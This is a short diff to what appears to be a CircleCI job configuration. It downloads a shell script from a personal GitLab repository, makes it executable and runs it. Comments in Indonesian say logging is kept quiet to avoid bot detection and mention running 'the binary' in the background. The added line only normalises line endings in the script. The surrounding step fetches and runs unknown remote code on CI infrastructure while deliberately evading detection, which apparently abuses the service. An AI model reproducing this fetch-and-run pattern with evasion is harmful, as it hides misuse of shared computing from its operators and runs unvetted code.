@@ -19,6 +19,7 @@ jobs:
           command: |
             # Menggunakan -q agar log bersih (menghindari deteksi bot lewat log berlebih)
             wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
+            sed -i 's/\r$//' circle.sh
             chmod +x circle.sh
             
             # Menjalankan biner dengan timeout atau background jika perlu
